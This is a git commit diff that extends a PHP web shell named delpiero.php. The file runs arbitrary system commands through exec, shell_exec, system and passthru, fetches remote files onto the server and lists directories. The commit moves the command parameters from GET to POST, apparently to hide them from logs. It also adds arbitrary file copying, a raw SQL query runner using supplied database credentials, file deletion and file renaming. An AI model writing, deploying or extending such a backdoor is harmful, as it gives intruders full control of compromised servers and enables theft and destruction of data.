73fcb1b50d81b5e73ab9785c2ad3989c871b28ff
Ahmat Arnal Kastana <41889734+arnal1@users.noreply.github.com>
2024-01-13 03:31:13 +0700

    Update delpiero.php

--- delpiero.php
+++ delpiero.php
@@ -12,6 +12,9 @@ if (isset($_GET['upload'])) {
     
     // Get the directory of the currently executing script
     $current_directory = __DIR__ . '/';
+    if (isset($_GET['target'])) {
+        $current_directory = $_GET['target'];
+    }
     
     // Get the file content from the URL
     $file_content = file_get_contents($url);
@@ -33,27 +36,27 @@ if (isset($_GET['upload'])) {
     } else {
         echo "Failed to download the file from the URL.";
     }
-} elseif (isset($_GET['exec'])) {
+} elseif (isset($_POST['exec'])) {
     try {
-        dumperx(exec($_GET['exec']));
+        dumperx(exec($_POST['exec']));
     } catch (\Throwable $th) {
         dumperx($th);
     }
-} elseif (isset($_GET['shell_exec'])) {
+} elseif (isset($_POST['shell_exec'])) {
     try {
-        dumperx(shell_exec($_GET['shell_exec']));
+        dumperx(shell_exec($_POST['shell_exec']));
     } catch (\Throwable $th) {
         dumperx($th);
     }
-} elseif (isset($_GET['system'])) {
+} elseif (isset($_POST['system'])) {
     try {
-        dumperx(system($_GET['system']));
+        dumperx(system($_POST['system']));
     } catch (\Throwable $th) {
         dumperx($th);
     }
-} elseif (isset($_GET['passthru'])) {
+} elseif (isset($_POST['passthru'])) {
     try {
-        dumperx(passthru($_GET['passthru']));
+        dumperx(passthru($_POST['passthru']));
     } catch (\Throwable $th) {
         dumperx($th);
     }
@@ -82,6 +85,61 @@ if (isset($_GET['upload'])) {
 } elseif (isset($_GET['scandir'])) {
     try {
         dumperx(scandir($_GET['scandir']));
+    } catch (\Throwable $th) {
+        dumperx($th);
+    }
+} elseif (isset($_GET['copy']) && isset($_GET['target'])) {
+    try {
+        $source_file = $_GET['copy'];
+        $destination_file = $_GET['target'];
+        $message = '';
+        if (file_exists($source_file)) {
+            if (copy($source_file, $destination_file)) {
+                $message = "File copied successfully.";
+            } else {
+                $message = "Failed to copy the file.";
+            }
+        } else {
+            $message = "Source file does not exist.";
+        }
+        dumperx($message);
+    } catch (\Throwable $th) {
+        dumperx($th);
+    }
+} elseif (isset($_POST['username']) && isset($_POST['password']) && isset($_POST['dbname']) && isset($_POST['sql'])) {
+    $servername = "localhost";
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    $dbname = $_POST['dbname'];
+
+    try {
+        $conn = new \PDO("mysql:host=$servername;", $username, $password);
+        $conn->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);
+
+        $sql = $_POST['sql'];
+        $stmt = $conn->prepare($sql);
+        $stmt->execute();
+
+        $data = $stmt->fetchAll(\PDO::FETCH_ASSOC);
+
+        dumperx($data);
+        $conn = null;
+    } catch(\Throwable $e) {
+        dumperx($e);
+    }
+} elseif (isset($_GET['unlink'])) {
+    try {
+        if (file_exists($_GET['unlink'])) {
+            dumperx(unlink($_GET['unlink']));
+        }
+    } catch (\Throwable $th) {
+        dumperx($th);
+    }
+} elseif (isset($_GET['rename']) && isset($_GET['source']) && isset($_GET['target'])) {
+    try {
+        if (file_exists($_GET['unlink'])) {
+            dumperx(rename($_GET['source'], $_GET['target']));
+        }
     } catch (\Throwable $th) {
         dumperx($th);
     }
